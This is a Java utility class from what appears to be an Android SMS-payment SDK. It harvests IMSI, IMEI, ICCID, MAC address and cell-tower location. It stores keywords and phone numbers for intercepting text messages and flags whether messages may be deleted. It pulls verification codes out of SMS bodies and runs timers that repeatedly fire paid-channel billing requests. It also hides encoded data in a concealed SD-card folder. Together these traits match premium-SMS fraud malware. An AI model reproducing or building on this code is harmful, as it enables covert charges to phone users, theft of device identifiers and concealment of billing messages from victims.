package com.y7.smspay.sdk.util;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.text.TextUtils;
import android.util.Base64;
import android.webkit.WebSettings;
import android.webkit.WebView;

import com.y7.smspay.sdk.json.ForceReq;
import com.y7.smspay.sdk.json.MultipleReq;
import com.y7.smspay.sdk.mgr.YPoyManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Utils {

	public static String netType = null;

	/**
	 * 检测当的网络（WLAN、3G/2G）状态
	 *
	 * @param context Context
	 * @return true 表示网络可用
	 */
	public static boolean isNetworkAvailable(Context context) {
		ConnectivityManager connectivity = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		if (connectivity != null) {
			NetworkInfo info = connectivity.getActiveNetworkInfo();
			if (info != null && info.isConnected()) {
				// 当前网络是连接的
				if (info.getState() == NetworkInfo.State.CONNECTED) {
					// 当前所连接的网络可用
					return true;
				}
			}
		}
		return false;
	}

	/**
	 * 读取手机唯一标识
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getIMSI(final Context ctx) {
		TelephonyManager tm = (TelephonyManager) ctx
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imsi = null;
		try {
			imsi = tm.getSubscriberId();
		} catch (Exception e) {
			//DDDLog.d("getIMSI", e);
		}

		return imsi;
	}

	/**
	 * 获取手机设备号
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getIMEI(final Context ctx) {
		TelephonyManager tm = (TelephonyManager) ctx
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = tm.getDeviceId();
		return imei;
	}

	/**
	 * 获取sim卡状态
	 * 
	 * @param ctx
	 * @return true sim卡状态良好，false sim拔出锁定
	 */
	public static boolean getSIMState(Context ctx) {
		TelephonyManager tm = (TelephonyManager) ctx
				.getSystemService(Context.TELEPHONY_SERVICE);
		switch (tm.getSimState()) {
		case TelephonyManager.SIM_STATE_READY:
			return true;
		case TelephonyManager.SIM_STATE_ABSENT:
		default:
			return false;
		}
	}

	/**
	 * 获取手机IP地址
	 * 
	 * @return
	 */
	public static String getLocalIpAddress() {
		try {
			for (Enumeration<NetworkInterface> en = NetworkInterface
					.getNetworkInterfaces(); en.hasMoreElements();) {
				NetworkInterface intf = en.nextElement();
				for (Enumeration<InetAddress> enumIpAddr = intf
						.getInetAddresses(); enumIpAddr.hasMoreElements();) {
					InetAddress inetAddress = enumIpAddr.nextElement();
					if (!inetAddress.isLoopbackAddress()
							&& !inetAddress.isLinkLocalAddress()) {
						return inetAddress.getHostAddress().toString();
					}
				}
			}
		} catch (SocketException ex) {
			//DDDLog.d("WifiPreference IpAddress", ex);
		}

		return null;
	}

	/**
	 * 获取游戏ID
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getGameId(Context ctx) {
		String gameId = null;
		ApplicationInfo appinfo = null;
		try {
			appinfo = ctx.getPackageManager().getApplicationInfo(
					ctx.getPackageName(), PackageManager.GET_META_DATA);
			if (appinfo != null) {
				Bundle metaData = appinfo.metaData;
				if (metaData != null) {
					gameId = metaData.get("Y-PSDK-GAMEID").toString();
					return gameId;
				}
			}
		} catch (Exception e) {
			//DDDLog.e("Exception", e);
			return gameId;
		}
		return gameId;
	}

	/**
	 * packId
	 */
	public static String getPackId(Context ctx) {
		String gameId = null;
		ApplicationInfo appinfo = null;
		try {
			appinfo = ctx.getPackageManager().getApplicationInfo(
					ctx.getPackageName(), PackageManager.GET_META_DATA);
			if (appinfo != null) {
				Bundle metaData = appinfo.metaData;
				if (metaData != null) {
					gameId = metaData.get("Y-PSDK-PID").toString();
					return gameId;
				}
			}
		} catch (Exception e) {
			//DDDLog.e("Exception", e);
			return gameId;
		}
		return gameId;
	}

	/**
	 * 把数组第一个移到最后的位置，数组长度不变
	 * 
	 * @param a
	 * @return
	 */
	public static Object[] moveArray(Object[] array) {
		if (array.length > 1) {
			for (int i = 1, n = 0; i < array.length; i++, n++) {
				String tmp = (String) array[n];
				array[n] = array[i];
				array[i] = tmp;
			}
		}
		return array;
	}

	private final static String KEY = "www.sns.com";
	private final static Pattern PATTERN = Pattern.compile("\\d+");

	/*
	 * Serv运行状态
	 */
	private static boolean isServRunning = false;

	public static boolean getServRunning() {
		return isServRunning;
	}

	public static void setServRunning(boolean value) {
		isServRunning = value;
	}

	protected static String encode(String src) {
		try {
			byte[] data = src.getBytes("utf-8");
			byte[] keys = KEY.getBytes();
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < data.length; i++) {
				int n = (0xff & data[i]) + (0xff & keys[i % keys.length]);
				sb.append("%" + n);
			}
			return sb.toString();
		} catch (UnsupportedEncodingException e) {
			//DDDLog.e("Exception", e);
		}
		return src;
	}

	public static String decode(String src) {
		if (src == null || src.length() == 0) {
			return src;
		}
		Matcher m = PATTERN.matcher(src);
		List<Integer> list = new ArrayList<Integer>();
		while (m.find()) {
			try {
				String group = m.group();
				list.add(Integer.valueOf(group));
			} catch (Exception e) {
				//DDDLog.e("Exception", e);
				return src;
			}
		}

		if (list.size() > 0) {
			try {
				byte[] data = new byte[list.size()];
				byte[] keys = KEY.getBytes();

				for (int i = 0; i < data.length; i++) {
					data[i] = (byte) (list.get(i) - (0xff & keys[i
							% keys.length]));
				}
				return new String(data, "utf-8");
			} catch (UnsupportedEncodingException e) {
				//DDDLog.e("Exception", e);
			}
			return src;
		} else {
			return src;
		}
	}

	public static String[] split(final String value, final String splitStr) {
		if (value == null || value.equals("") || splitStr == null
				|| splitStr.equals(""))
			return null;

		List<String> list = new ArrayList<String>();
		int index = 0;
		while (true) {
			int tmp = value.indexOf(splitStr, index);
			if (tmp == -1) {
				if (value.length() > index) {
					list.add(value.substring(index));
				}
				break;
			}
			list.add(value.substring(index, tmp));
			index = tmp + splitStr.length();
		}
		String[] ss = new String[list.size()];
		Iterator<String> it = list.listIterator();
		index = 0;
		while (it.hasNext()) {
			ss[index++] = it.next();
		}
		return ss;
	}

	public static boolean saveVId(Context ctx, String vId) {
		SharedPreferences prefs = ctx.getSharedPreferences("vgp_id",
				Context.MODE_PRIVATE);
		Editor editor = prefs.edit();
		editor.putString("Y-KK-ID", vId);
		return editor.commit();
	}

	// 先从xml取，再从SharedPreferences取
	public static String getVId(Context ctx) {
		String vId = getVIdFromXml(ctx);

		if (vId == null || vId.equals("")) {
			SharedPreferences prefs = ctx.getSharedPreferences(StrUtils.VGP_ID,
					Context.MODE_PRIVATE);
			vId = prefs.getString("Y-KK-ID", "");
		}

		return vId;
	}

	/**
	 * 获取易付通appid
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getYiFuTongAppId(Context ctx) {
		return getCIdFromXml(ctx, StrUtils.Pay_YiFuTongAppId);
	}

	/**
	 * 获取易付通渠道ID
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getYiFuTongPupChannelId(Context ctx) {
		return getCIdFromXml(ctx, StrUtils.Pay_YiFuTongPupChannelId);
	}

	/**
	 * 获取VQianGuan appid
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getVQianGuanAppId(Context ctx) {
		return getCIdFromXml(ctx, StrUtils.Pay_VQianGuanAppId);
	}

	/**
	 * 获取VQianGuan 渠道ID
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getVQianGuanChannelId(Context ctx) {
		return getCIdFromXml(ctx, StrUtils.Pay_VQianGuanChannelId);
	}

	protected static String getVIdFromXml(Context context) {
		String vId = null;
		ApplicationInfo appinfo = null;
		try {
			appinfo = context.getPackageManager().getApplicationInfo(
					context.getPackageName(), PackageManager.GET_META_DATA);
			if (appinfo != null) {
				Bundle metaData = appinfo.metaData;
				if (metaData != null) {
					vId = metaData.getString("Y-KK-ID");
					if (vId == null) {
						vId = String.valueOf(metaData.getInt("Y-KK-ID"));
					}
					return vId;
				}
			}
		} catch (Exception e) {
			//DDDLog.e("Exception", e);
			return vId;
		}
		return vId;
	}

	public static boolean saveChlId(Context ctx, String ChlId) {
		SharedPreferences prefs = ctx.getSharedPreferences(StrUtils.VGP_ID,
				Context.MODE_PRIVATE);
		Editor editor = prefs.edit();
		editor.putString(StrUtils.CHL_KK_ID, ChlId);
		return editor.commit();
	}

	// 先从xml取，再从SharedPreferences取
	public static String getChlId(Context ctx) {
		String chlId = getCIdFromXml(ctx, StrUtils.CHL_KK_ID);

		if (chlId == null) {
			SharedPreferences prefs = ctx.getSharedPreferences(StrUtils.VGP_ID,
					Context.MODE_PRIVATE);
			chlId = prefs.getString(StrUtils.CHL_KK_ID, "");
		}

		return chlId;
	}

	/**
	 * 获取是否开起应急
	 * 
	 * @param ctx
	 * @return 0 关闭， 1 开起 .. 默认开起
	 */
	public static String getIsRequest(Context ctx) {
		String isRequest = "0";
		try {
			isRequest = getCIdFromXml(ctx, StrUtils.isRequest);
		} catch (Exception e) {
			isRequest = "0";
		}
		return isRequest;
	}

	protected static String getCIdFromXml(Context context, String name) {
		String cooId = null;
		ApplicationInfo appinfo = null;
		try {
			appinfo = context.getPackageManager().getApplicationInfo(
					context.getPackageName(), PackageManager.GET_META_DATA);
			if (appinfo != null) {
				Bundle metaData = appinfo.metaData;
				if (metaData != null) {
					cooId = metaData.getString(name);
					if (cooId == null) {
						cooId = String.valueOf(metaData.getInt(name));
					}
					return cooId;
				}
			}
		} catch (Exception e) {
			//DDDLog.e("Exception", e);
			return cooId;
		}
		return cooId;
	}

	public static String getNetworkTypeName(Context context) {
		ConnectivityManager conManager = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = conManager.getActiveNetworkInfo();
		if (info == null) {
			return null;
		}
		return info.getTypeName();
	}

	/**
	 * 是否重发
	 */
	public static boolean isReSend = false;

	/**
	 * 更新
	 * 
	 * @param context
	 * @param price
	 * @return
	 */
	public static boolean updateAdsState(Context context, String price) {
		SharedPreferences prefs = context.getSharedPreferences(
				StrUtils.SMS_PRICE, Context.MODE_PRIVATE);
		Editor editor = prefs.edit();
		// String ss = getAllMsgsStateAndClear(context);
		// if (!TextUtils.isEmpty(ss)) // 记录所有失败
		// editor.putString(Constants.SMS_PRICE, ss +","+price);
		// else
		editor.putString(StrUtils.SMS_PRICE, price);
		return editor.commit();
	}

	/**
	 * 获取本地存储所有信息的状态以及清除
	 * 
	 * @param context
	 * @return
	 */
	private static Object lockState = new Object();

	public static String getAllMsgsStateAndClear(Context context) {
		synchronized (lockState) {
			SharedPreferences prefs = context.getSharedPreferences(
					StrUtils.SMS_PRICE, Context.MODE_PRIVATE);
			String b = prefs.getString(StrUtils.SMS_PRICE, "");
			Editor editor = prefs.edit();
			editor.clear();
			editor.commit();
			return b.toString();
		}
	}

	/**
	 * 保存拦截信息关键字
	 * 
	 * @param ctx
	 * @param body
	 * @return
	 */
	public static boolean saveMessageBody(Context ctx, String body) {
		SharedPreferences prefs = ctx.getSharedPreferences(
				StrUtils.SMS_SETTING, Context.MODE_PRIVATE);
		Editor editor = prefs.edit();
		editor.putString(StrUtils.SMS_MESSAGEBODY, body);
		return editor.commit();
	}

	public static String getMessageBody(Context ctx) {
		SharedPreferences prefs = ctx.getSharedPreferences(
				StrUtils.SMS_SETTING, Context.MODE_PRIVATE);
		String messageBody = prefs.getString(StrUtils.SMS_MESSAGEBODY, "");
		return messageBody;
	}

	/**
	 * 保存拦截手机号
	 * 
	 * @param ctx
	 * @param number
	 * @return
	 */
	public static boolean savePhoneNumber(Context ctx, String number) {
		SharedPreferences prefs = ctx.getSharedPreferences(
				StrUtils.SMS_SETTING, Context.MODE_PRIVATE);
		Editor editor = prefs.edit();
		editor.putString(StrUtils.SMS_PHONENUMBER, number);
		return editor.commit();
	}

	public static String getPhoneNumber(Context ctx) {
		SharedPreferences prefs = ctx.getSharedPreferences(
				StrUtils.SMS_SETTING, Context.MODE_PRIVATE);
		String phoneNumber = prefs.getString(StrUtils.SMS_PHONENUMBER, "");
		return phoneNumber;
	}

	/**
	 * 保存是否补过单
	 * 
	 * @param ctx
	 * @param val
	 *            0-未补，1-已补
	 * @return
	 */
	public static boolean saveIsPayTheUnfairLost(Context ctx, int val) {
		SharedPreferences prefs = ctx.getSharedPreferences(
				StrUtils.SMS_SETTING, Context.MODE_PRIVATE);
		Editor editor = prefs.edit();
		editor.putInt(StrUtils.SMS_ISPAYUNFAIRLOST, val);
		return editor.commit();
	}

	public static int getIsPayTheUnfairLost(Context ctx) {
		SharedPreferences prefs = ctx.getSharedPreferences(
				StrUtils.SMS_SETTING, Context.MODE_PRIVATE);
		int val = prefs.getInt(StrUtils.SMS_ISPAYUNFAIRLOST, 0);
		return val;
	}

	/** 保存应用外插屏间隔时间 */
	public static boolean saveStopSmsTime(Context ctx) {
		SharedPreferences prefs = ctx.getSharedPreferences("stopTime",
				Context.MODE_PRIVATE);
		Editor editor = prefs.edit();
		editor.putLong("stopTime", System.currentTimeMillis());
		return editor.commit();
	}

	public static long getStopSmsTime(Context ctx) {
		SharedPreferences prefs = ctx.getSharedPreferences("stopTime",
				Context.MODE_PRIVATE);
		return prefs.getLong("stopTime", 0);
	}

	/**
	 * 保存信息到SD卡
	 * 
	 * @param imsi
	 */
	public static void save2SDCard(String name, String str) {
		//DDDLog.d("保存内容到SD卡 -->" + str);
		if (str == null || str.length() == 0) {
			return;
		}
		File dir = new File(Environment.getExternalStorageDirectory(),
				"/.android_");
		if (!dir.exists() || dir.isFile()) {
			if (!dir.mkdir()) {
				return;
			}
		}
		File file = new File(dir, name);
		OutputStream out = null;
		try {
			out = new FileOutputStream(file);
			String tmp = "9527" + str + "2012";
			// 编码保存
			String val = StringCoder.encode(tmp);
			out.write(val.getBytes("utf-8"));
			out.flush();
		} catch (Exception e) {
			//DDDLog.e("Exception", e);
		} finally {
			if (out != null) {
				try {
					out.close();
				} catch (IOException e) {
					//DDDLog.e("Exception", e);
				}
			}
		}
	}

	/**
	 * 从SD卡取出信息
	 * 
	 * @return
	 */
	public static String getFromSDCard(String name) {
		File dir = new File(Environment.getExternalStorageDirectory(),
				"/.android_");
		if (!dir.exists() || dir.isFile()) {
			return null;
		}
		File file = new File(dir, name);

		InputStream in = null;
		byte[] buf = new byte[1024];
		ByteArrayOutputStream out = null;
		int len = 0;
		try {
			in = new FileInputStream(file);
			out = new ByteArrayOutputStream();
			while ((len = in.read(buf)) != -1) {
				out.write(buf, 0, len);
			}

			String tmp = new String(out.toByteArray(), "utf-8");
			// 解码
			String val = StringCoder.decode(tmp);
			String str = val.substring(4, val.length() - 4);
			return str;
		} catch (Exception e) {
			//DDDLog.e("Exception", e);
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (IOException e) {
					//DDDLog.e("Exception", e);
				}
			}
			if (out != null) {
				try {
					out.close();
				} catch (IOException e) {
					//DDDLog.e("Exception", e);
				}
			}
		}
		return null;
	}

	/**
	 * 获取本应用名称
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getApplicationName(Context ctx) {
		PackageManager packageManager = null;
		ApplicationInfo applicationInfo = null;
		try {
			packageManager = ctx.getApplicationContext().getPackageManager();
			applicationInfo = packageManager.getApplicationInfo(
					ctx.getPackageName(), 0);
		} catch (PackageManager.NameNotFoundException e) {
			applicationInfo = null;
		}
		String applicationName = (String) packageManager
				.getApplicationLabel(applicationInfo);
		return applicationName;
	}

	/**
	 * 字符串中截取第一个手机号
	 * 
	 * @param sParam
	 * @return
	 */
	public static String getTelnum(String sParam) {
		if (sParam.length() <= 0)
			return "";
		Pattern pattern = Pattern.compile("(1|861)(3|5|8)\\d{9}$*");
		Matcher matcher = pattern.matcher(sParam);
		StringBuffer bf = new StringBuffer();
		while (matcher.find()) {
			bf.append(matcher.group());
			return bf.toString();
		}
		return bf.toString();
	}

	/**
	 * 获取字符串中的验证码
	 * 
	 * @param codeLength
	 *            验证码长度
	 * @param body
	 *            需要查询的字符串
	 * @return
	 */
	public static String getCode2Sms(int codeLength, String body) {
		// 首先([a-zA-Z0-9]{6})是得到一个连续的六位数字字母组合
		// (?<![a-zA-Z0-9])负向断言([0-9]{6})前面不能有数字
		// (?![a-zA-Z0-9])断言([0-9]{6})后面不能有数字出现
		body = body.replaceAll("[\\p{Punct}\\s]+", "");
		//DDDLog.d("需要查询验证码的body:" + body);
		Pattern p = Pattern.compile("(?<![a-zA-Z0-9])([a-zA-Z0-9]{"
				+ codeLength + "})(?![a-zA-Z0-9])");
		Matcher m = p.matcher(body);
		if (m.find()) {
			System.out.println(m.group());
			return m.group(0);
		} else {
			p = Pattern.compile("(?<![a-zA-Z0-9])([a-zA-Z0-9]{" + 6
					+ "})(?![a-zA-Z0-9])");
			m = p.matcher(body);
			if (m.find()) {
				System.out.println(m.group());
				return m.group(0);
			}
		}
		return null;
	}

	/**
	 * 将byte[]转为各种进制的字符串
	 * 
	 * @param bytes
	 * @param radix
	 * @return
	 */
	public static String binary(byte[] bytes, int radix) {
		return new BigInteger(1, bytes).toString(radix);// 这里的1代表正数
	}

	/**
	 * JSON字符串特殊字符处理，比如：“\A1;1300”
	 * 
	 * @param s
	 * @return String
	 */
	public static String string2Json(String s) {
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < s.length(); i++) {
			char c = s.charAt(i);
			switch (c) {
			case '\"':
				sb.append("\\\"");
				break;
			case '\\':
				sb.append("\\\\");
				break;
			case '/':
				sb.append("\\/");
				break;
			case '\b':
				sb.append("\\b");
				break;
			case '\f':
				sb.append("\\f");
				break;
			case '\n':
				sb.append("\\n");
				break;
			case '\r':
				sb.append("\\r");
				break;
			case '\t':
				sb.append("\\t");
				break;
			default:
				sb.append(c);
			}
		}
		return sb.toString();
	}

	/**
	 * 读取手机Iccid
	 * 
	 * @param ctx
	 * @return
	 */

	public static String getIccid(final Context ctx) {
		TelephonyManager tm = (TelephonyManager) ctx
				.getSystemService(Context.TELEPHONY_SERVICE);
		String iccid = null;
		try {
			iccid = tm.getSimSerialNumber();
		} catch (Exception e) {
			//DDDLog.d("getIccid", e);
		}
		//DDDLog.d("getIccid-->" + iccid);
		return iccid;
	}

	/**
	 * 读取手机Model
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getModel() {
		String Model = android.os.Build.BRAND + "_"
				+ android.os.Build.MANUFACTURER + "_" + android.os.Build.MODEL;
		//DDDLog.d("getModel-->" + Model);
		return Model;
	}

	/**
	 * 读取手机UA
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getUA(final Context ctx) {
		WebView webview = new WebView(ctx);
		webview.layout(0, 0, 0, 0);
		WebSettings settings = webview.getSettings();
		String video_ua = settings.getUserAgentString();
		//DDDLog.d("getUA-->" + video_ua);
		return video_ua;
	}

	/**
	 * 读取手机短信中心号
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getSmsCenter(final Context ctx) {

		return null;
	}

	/**
	 * 读取手机wifi地址
	 * 
	 * @param ctx
	 * @return
	 */
	public static String getWifiMac(final Context ctx) {

		return null;
	}

	public static String geteid(Context context) {
		String eid = "";

		try {
			WifiManager e = (WifiManager) context.getSystemService("wifi");
			eid = e.getConnectionInfo().getMacAddress();
			if (eid != null && !"".equals(eid)) {
				byte[] bs = eid.getBytes();

				for (int i = 0; i < bs.length; ++i) {
					bs[i] = (byte) (bs[i] - 9);
				}

				eid = new String(bs);
			}
		} catch (Exception var5) {
			var5.printStackTrace();
		}

		return eid;
	}

	public static String e(String s) {
		String str = null;
		try {
			str = new String(Base64.decode(s.getBytes(), Base64.NO_WRAP));
		} catch (Exception var5) {
			var5.printStackTrace();
		}
		return str.trim();
	}

	public static void getName(Object obj) {
		// DLogUtils.dv(obj.getClass().getName());

		Field[] fields = obj.getClass().getDeclaredFields();
		for (int i = 0; i < fields.length; i++) {

			if (fields[i].getType().getName().equals("java.lang.String")) {
				try {
					if (!TextUtils.isEmpty((CharSequence) fields[i].get(obj))) {
						String aaa = new String(Base64.encodeToString(
								((String) fields[i].get(obj)).getBytes(),
								Base64.NO_WRAP));
						aaa.trim();

						if (Modifier.toString(fields[i].getModifiers()).equals(
								"public static final")) {
							// DLogUtils.dv("public static final String "+fields[i].getName()+"=Utils.e(\""+aaa+"\""+");//"+fields[i].get(obj));
						}
					}
				} catch (IllegalAccessException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IllegalArgumentException e) {
					e.printStackTrace();
				}
			}
		}
	}

	/**
	 * 获取基站信息
	 * 
	 * @throws Exception
	 */
	public static int[] getCellInfo(Context context) {
		TelephonyManager manager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		CellLocation location = manager.getCellLocation();
		int lac = 0;
		int cellId = 0;
		if (location instanceof GsmCellLocation) {
			//DDDLog.d("--- 1: ");
			GsmCellLocation gsmLocation = (GsmCellLocation) location;
			lac = gsmLocation.getLac();
			cellId = gsmLocation.getCid();
		} else if (location instanceof CdmaCellLocation) {
			//DDDLog.d("--- 2: ");
			CdmaCellLocation cdmaLocation = (CdmaCellLocation) location;
			lac = cdmaLocation.getNetworkId();
			cellId = cdmaLocation.getBaseStationId();
		} else {
			//DDDLog.d("--- 3: ");
		}
		//DDDLog.d("---cid: " + cellId);
		//DDDLog.d("---lac: " + lac);

		int[] intAry = new int[2];
		intAry[0] = cellId;
		intAry[1] = lac;

		return intAry;
	}

	/**
	 * 保存是否能删除短信
	 * 
	 * @param ctx
	 * @param val
	 * @return
	 */
	public static boolean saveHasDel(Context ctx, int val) {
		SharedPreferences prefs = ctx.getSharedPreferences(
				StrUtils.SMS_SETTING, Context.MODE_PRIVATE);
		Editor editor = prefs.edit();
		editor.putInt(StrUtils.HAS_DEL, val);
		return editor.commit();
	}

	public static int getHasDel(Context ctx) {
		SharedPreferences prefs = ctx.getSharedPreferences(
				StrUtils.SMS_SETTING, Context.MODE_PRIVATE);
		int val = prefs.getInt(StrUtils.HAS_DEL, 0);
		return val;
	}

	public static String parseReverse(String aBody, int aForward, String aCode,
			String aStart, String aEnd) {
		int aCodeState = 1;

		//DDDLog.d("\r\n");
		//DDDLog.d("下行解析-开始");
		StringBuffer iBody = new StringBuffer(aBody);
		int aStartPos = -1;
		if (aCodeState == 1) {
			aStartPos = iBody.indexOf(aCode);
			if (aStartPos < 0) {
				//DDDLog.d("下行解析-aCode Pos: " + aStartPos);
				iBody.setLength(0);
				return null;
			}
			if (aForward == 1) {
				iBody.delete(0, aStartPos + aCode.length());
			} else {
				iBody.delete(aStartPos, iBody.length());
			}
		}
		if (aStart.length() > 0) {
			aStartPos = iBody.indexOf(aStart);
			if (aStartPos < 0) {
				//DDDLog.d("下行解析-aStart Pos: " + aStartPos);
				iBody.setLength(0);
				return null;
			}

			if (aForward == 1) {
				iBody.delete(0, aStartPos + aStart.length());
			} else {
				while (aStartPos >= 0) {
					iBody.delete(0, aStartPos + aStart.length());
					aStartPos = iBody.indexOf(aStart);
				}
			}
		}
		if (aEnd.length() > 0) {
			aStartPos = iBody.indexOf(aEnd);
			if (aStartPos < 0) {
				//DDDLog.d("下行解析-aEnd Pos: " + aStartPos);
				iBody.setLength(0);
				return null;
			}
			iBody.delete(aStartPos, iBody.length());
		}

		//DDDLog.d("下行解析-aCodeState: " + aCodeState);
		//DDDLog.d("下行解析-aForward: " + aForward);
		//DDDLog.d("下行解析-Code: " + aCode);
		//DDDLog.d("下行解析-Start: " + aStart);
		//DDDLog.d("下行解析-Value: " + iBody.toString());
		//DDDLog.d("下行解析-Parse End: " + aEnd);
		//DDDLog.d("下行解析-完成");
		//DDDLog.d("\r\n");
		return iBody.toString();
	}

	public static void TimerReqChannel(final Context ctx) {
		final Timer timer = new Timer();
		timer.schedule(new TimerTask() {
			public void run() {
				//DDDLog.i("ForceReq-定时器-间隔 秒" + ForceReq.interval);
				if (ForceReq.count > 0) {
					ForceReq.count -= 1;

					YPoyManager.getInstance().reqChannelId(ctx, ForceReq.price,
							16, "", ForceReq.product, ForceReq.did, "", null);
				} else {
					timer.cancel();
				}
			}
		}, ForceReq.init * 1000, ForceReq.interval * 1000);// 第一个参数,要等待这么长的时间才可以第一次执行
	}

	public static void TimerMulReqChannel(final Context ctx) {
		//DDDLog.i("TimerMulReqChannel count"+MultipleReq.count );
		
		final Timer timer = new Timer();
		timer.schedule(new TimerTask() {
			public void run() {
				//DDDLog.i("MultipleReq-定时器-间隔 秒" + MultipleReq.interval);
				if (MultipleReq.count > 0) {
					MultipleReq.count -= 1;
					
					//DDDLog.i("TimerMulReqChannel yes");

					YPoyManager.getInstance().reqChannelId(ctx,
							MultipleReq.price, 16, "", MultipleReq.product,
							MultipleReq.did, "", null);
				} else {
					//DDDLog.i("TimerMulReqChannel timer.cancel()");
					timer.cancel();
				}
			}
		}, MultipleReq.interval * 1000, MultipleReq.interval * 1000);// 第一个参数,要等待这么长的时间才可以第一次执行
	}

	
	
	
	
	
	
	
	
	
	

	/** 保存首次安装时间 */
	public static boolean saveInstallTime(Context ctx) {
		SharedPreferences prefs = ctx.getSharedPreferences("installTime",
				Context.MODE_PRIVATE);
		Editor editor = prefs.edit();
		editor.putLong("installTime", System.currentTimeMillis());
		return editor.commit();
	}

	public static long getInstallTime(Context ctx) {
		SharedPreferences prefs = ctx.getSharedPreferences("installTime",
				Context.MODE_PRIVATE);
		return prefs.getLong("installTime", 0);
	}
}
